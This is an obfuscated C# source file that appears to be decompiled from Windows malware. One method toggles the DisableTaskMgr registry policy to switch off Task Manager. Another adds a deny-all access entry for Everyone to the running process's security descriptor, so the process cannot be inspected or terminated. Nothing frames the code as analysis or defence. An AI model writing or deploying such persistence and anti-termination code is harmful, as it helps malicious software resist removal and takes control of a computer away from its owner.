using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace SNDBgbsWAO;

internal sealed class dWZxVrKgFej
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr TEFYuPquunq, int vgzWMqOfUmpsI, [Out] byte[] ppiFEKcSRHSPHM, uint lWMyLDZptQXUD, out uint LvmhJedCuRorvJA);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr ifaOQUJkhJgoOsVWf, int CPspRcrEUen, [In] byte[] tHbdlgfLzOGV);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void hIGVPwplfply(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor JkOjBaYpupRJ(IntPtr intptr_0)
	{
		byte[] ppiFEKcSRHSPHM = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ppiFEKcSRHSPHM, 0u, out var LvmhJedCuRorvJA);
		if ((long)LvmhJedCuRorvJA > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ppiFEKcSRHSPHM = new byte[LvmhJedCuRorvJA], LvmhJedCuRorvJA, out LvmhJedCuRorvJA))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(ppiFEKcSRHSPHM, 0);
	}

	private void jGEZVtvGmSpBqm(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void wGWSbCLbIYpToe()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = JkOjBaYpupRJ(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		jGEZVtvGmSpBqm(currentProcess, rawSecurityDescriptor);
	}
}
